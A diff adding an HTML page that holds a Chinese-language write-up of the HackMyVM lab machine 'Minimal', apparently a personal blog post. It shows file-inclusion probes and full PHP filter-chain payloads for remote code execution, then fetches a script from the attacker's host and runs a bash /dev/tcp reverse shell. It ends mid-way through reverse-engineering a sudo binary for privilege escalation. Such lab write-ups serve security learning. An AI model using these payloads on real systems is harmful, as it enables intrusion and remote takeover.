@@ -1,0 +1,624 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="dark" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />
+    
+    <link rel="icon" href="https://github.githubassets.com/favicons/favicon.svg"><script>
+        let theme = localStorage.getItem("meek_theme") || "light";
+        document.documentElement.setAttribute("data-color-mode", theme);
+    </script>
+<meta name="description" content="# hmv_Minimal
+
+# 0.简介
+
+**靶机**：[hackmyvm - Minimal](https://hackmyvm.eu/machines/machine.php?vm=Minimal)
+**难度**：黄色
+**目标 IP**：192.168.205.135
+**本机 IP**：192.168.205.141
+
+# 1.扫描
+
+`nmap`起手
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.135
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-14 14:58 CST
+Nmap scan report for 192.168.205.135
+Host is up (0.00054s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:0D:67:64 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 2.62 seconds
+```
+
+先看**80端口**，**22端口**候补
+
+# 2.踩点
+
+![image](https://github.com/user-attachments/assets/e779669a-453f-45b8-af0d-3cbc172561ce)
+
+（页面挺简洁）发现一个**登录网页(login.php)**  ，测试了`弱密码、sql注入、万能密码`均无果，没有现成的，我们自己注册一个
+
+![image](https://github.com/user-attachments/assets/d57f31d8-97d2-419e-99a0-a002e6e3086d)
+
+注册完之后，可以把一些商品加入购物车
+
+![image](https://github.com/user-attachments/assets/535d5286-48d7-4a29-ae43-f3ceebf03c31)
+
+当你准备买单的时候，点击`Buy items`会发现，网址出现了变化。">
+<meta property="og:title" content="hmv_Minimal">
+<meta property="og:description" content="# hmv_Minimal
+
+# 0.简介
+
+**靶机**：[hackmyvm - Minimal](https://hackmyvm.eu/machines/machine.php?vm=Minimal)
+**难度**：黄色
+**目标 IP**：192.168.205.135
+**本机 IP**：192.168.205.141
+
+# 1.扫描
+
+`nmap`起手
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.135
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-14 14:58 CST
+Nmap scan report for 192.168.205.135
+Host is up (0.00054s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:0D:67:64 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 2.62 seconds
+```
+
+先看**80端口**，**22端口**候补
+
+# 2.踩点
+
+![image](https://github.com/user-attachments/assets/e779669a-453f-45b8-af0d-3cbc172561ce)
+
+（页面挺简洁）发现一个**登录网页(login.php)**  ，测试了`弱密码、sql注入、万能密码`均无果，没有现成的，我们自己注册一个
+
+![image](https://github.com/user-attachments/assets/d57f31d8-97d2-419e-99a0-a002e6e3086d)
+
+注册完之后，可以把一些商品加入购物车
+
+![image](https://github.com/user-attachments/assets/535d5286-48d7-4a29-ae43-f3ceebf03c31)
+
+当你准备买单的时候，点击`Buy items`会发现，网址出现了变化。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://7r1UMPH.github.io/post/hmv_Minimal.html">
+<meta property="og:image" content="https://github.githubassets.com/favicons/favicon.svg">
+<title>hmv_Minimal</title>
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">hmv_Minimal</h1>
+<div class="title-right">
+    <a href="https://7r1UMPH.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/7r1UMPH/7r1UMPH.github.io/issues/29" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><h1>hmv_Minimal</h1>
+<h1>0.简介</h1>
+<p><strong>靶机</strong>：<a href="https://hackmyvm.eu/machines/machine.php?vm=Minimal" rel="nofollow">hackmyvm - Minimal</a><br>
+<strong>难度</strong>：黄色<br>
+<strong>目标 IP</strong>：192.168.205.135<br>
+<strong>本机 IP</strong>：192.168.205.141</p>
+<h1>1.扫描</h1>
+<p><code class="notranslate">nmap</code>起手</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.135
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-14 14:58 CST
+Nmap scan report <span class="pl-k">for</span> 192.168.205.135
+Host is up (0.00054s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:0D:67:64 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 2.62 seconds</pre></div>
+<p>先看<strong>80端口</strong>，<strong>22端口</strong>候补</p>
+<h1>2.踩点</h1>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/e779669a-453f-45b8-af0d-3cbc172561ce"><img src="https://github.com/user-attachments/assets/e779669a-453f-45b8-af0d-3cbc172561ce" alt="image" style="max-width: 100%;"></a></p>
+<p>（页面挺简洁）发现一个<strong>登录网页(login.php)</strong>  ，测试了<code class="notranslate">弱密码、sql注入、万能密码</code>均无果，没有现成的，我们自己注册一个</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/d57f31d8-97d2-419e-99a0-a002e6e3086d"><img src="https://github.com/user-attachments/assets/d57f31d8-97d2-419e-99a0-a002e6e3086d" alt="image" style="max-width: 100%;"></a></p>
+<p>注册完之后，可以把一些商品加入购物车</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/535d5286-48d7-4a29-ae43-f3ceebf03c31"><img src="https://github.com/user-attachments/assets/535d5286-48d7-4a29-ae43-f3ceebf03c31" alt="image" style="max-width: 100%;"></a></p>
+<p>当你准备买单的时候，点击<code class="notranslate">Buy items</code>会发现，网址出现了变化。新网址可能会存在文件包含漏洞，我们帮他测试一下❐‿❑</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">http://192.168.205.135/shop_cart.php<span class="pl-k">?</span>action=/etc/passwd
+http://192.168.205.135/shop_cart.php<span class="pl-k">?</span>action=../../../../etc/passwd
+http://192.168.205.135/shop_cart.php<span class="pl-k">?</span>action=....//....//....//....//etc/passwd
+http://192.168.205.135/shop_cart.php<span class="pl-k">?</span>action=php://filter/convert.base64-encode/resource=index</pre></div>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/d2f1f884-fd50-4efd-b512-b8667466e41e"><img src="https://github.com/user-attachments/assets/d2f1f884-fd50-4efd-b512-b8667466e41e" alt="image" style="max-width: 100%;"></a></p>
+<p>测试了四条，只有第四条有反应，我们继续尝试可不可以通过<strong>PHP 过滤器链</strong> 来执行命令</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/845afd2d-5281-4308-8119-58e7de747b75"><img src="https://github.com/user-attachments/assets/845afd2d-5281-4308-8119-58e7de747b75" alt="image" style="max-width: 100%;"></a></p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">http://192.168.205.135/shop_cart.php?action=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&amp;0=id</pre></div>
+<p>（☆ω☆*）可以执行，使用的是这个工具 <a href="https://github.com/synacktiv/php_filter_chain_generator">PHP Filter Chain Generator</a>。我们弹个shell回来</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">http://192.168.205.135/shop_cart.php?action=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&amp;0=curl 192.168.205.141/shell.sh -o /tmp/a.sh
+http://192.168.205.135/shop_cart.php?action=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&amp;0=chmod +x /tmp/a.sh
+http://192.168.205.135/shop_cart.php?action=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&amp;0=bash%20/tmp/a.sh
+
+
+┌──(kali㉿kali)-[~/test]
+└─$ cat shell.sh
+bash -i <span class="pl-k">&gt;&amp;</span> /dev/tcp/192.168.205.141/8888 <span class="pl-k">0&gt;&amp;1</span>                                   </pre></div>
+<p>成功弹回</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ nc -lvnp 8888        
+listening on [any] 8888 ...
+connect to [192.168.205.141] from (UNKNOWN) [192.168.205.135] 44534
+bash: cannot <span class="pl-c1">set</span> terminal process group (750): Inappropriate ioctl <span class="pl-k">for</span> device
+bash: no job control <span class="pl-k">in</span> this shell
+www-data@minimal:/var/www/html$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</pre></div>
+<h1>3. 获得稳定的 Shell</h1>
+<p>获取<strong>反向 shell</strong> 后，通过以下命令获得稳定的<strong>交互式</strong> <strong>TTY shell</strong>：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">script /dev/null -c bash  
+ctrl+z  
+stty raw -echo<span class="pl-k">;</span> <span class="pl-c1">fg</span>  
+reset xterm  
+<span class="pl-k">export</span> TERM=xterm  
+<span class="pl-c1">echo</span> <span class="pl-smi">$SHELL</span>  
+<span class="pl-k">export</span> SHELL=/bin/bash  
+stty rows 59 cols 236</pre></div>
+<h1>4.提权</h1>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@minimal:/var/www/html$ sudo -l
+Matching Defaults entries <span class="pl-k">for</span> www-data on minimal:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin<span class="pl-cce">\:</span>/usr/local/bin<span class="pl-cce">\:</span>/usr/sbin<span class="pl-cce">\:</span>/usr/bin<span class="pl-cce">\:</span>/sbin<span class="pl-cce">\:</span>/bin<span class="pl-cce">\:</span>/snap/bin, use_pty
+
+User www-data may run the following commands on minimal:
+    (root) NOPASSWD: /opt/quiz/shop
+www-data@minimal:/var/www/html$ ls -la /opt/quiz/shop
+-rwxrwxr-x 1 root root 16632 Nov  5  2023 /opt/quiz/shop
+</pre></div>
+<p>能<code class="notranslate">读取、执行</code>，不能修改(×﹏×)。我们把文件拖去本地用<strong>IDA</strong>看看</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">int __fastcall main(int argc, const char <span class="pl-k">**</span>argv, const char <span class="pl-k">**</span>envp)
+{
+  __int64 v3<span class="pl-k">;</span> // rdi
+  _DWORD v5[4]<span class="pl-k">;</span> // [rsp+10h] [rbp-20h] BYREF
+  char <span class="pl-k">*</span>v6<span class="pl-k">;</span> // [rsp+20h] [rbp-10h]
+  char <span class="pl-k">*</span>s<span class="pl-k">;</span> // [rsp+28h] [rbp-8h]
+
+  strcpy<span class="pl-s"><span class="pl-pds">((</span>char <span class="pl-k">*</span>)v<span class="pl-c1">5</span><span class="pl-k">,</span> "results.txt");</span>
+<span class="pl-s">  s = "Hey guys, I have prepared this little program to find out how much you know about me, since I have been your admin"</span>
+<span class="pl-s">      "istrator for <span class="pl-c1">2</span> years.";</span>
+<span class="pl-s">  v<span class="pl-c1">6</span> = "If you get all the questions right, you win a teddy bear and if you don't, you win a teddy bear and if you don't, you win trash";</span>
+<span class="pl-s">  puts(</span>
+<span class="pl-s">    "Hey guys, I have prepared this little program to find out how much you know about me, since I have been your adminis"</span>
+<span class="pl-s">    "trator for <span class="pl-c1">2</span> years.");</span>
+<span class="pl-s">  puts(</span>
+<span class="pl-s">    "If you get all the questions right, you win a teddy bear and if you don't, you win a teddy bear and if you don't, you win trash");</span>
+<span class="pl-s">  v<span class="pl-c1">5</span>[<span class="pl-c1">3</span>] = question_<span class="pl-c1">1</span>(</span>
+<span class="pl-s">            "If you get all the questions right, you win a teddy bear and if you don't, you win a teddy bear and if you d"</span>
+<span class="pl-s">            "on't, you win trash");</span>
+<span class="pl-s">  v<span class="pl-c1">5</span>[<span class="pl-c1">3</span>] += question_<span class="pl-c1">2</span>(</span>
+<span class="pl-s">             "If you get all the questions right, you win a teddy bear and if you don't, you win a teddy bear and if you "</span>
+<span class="pl-s">             "don't, you win trash");</span>
+<span class="pl-s">  v<span class="pl-c1">5</span>[<span class="pl-c1">3</span>] += question_<span class="pl-c1">3</span>(</span>
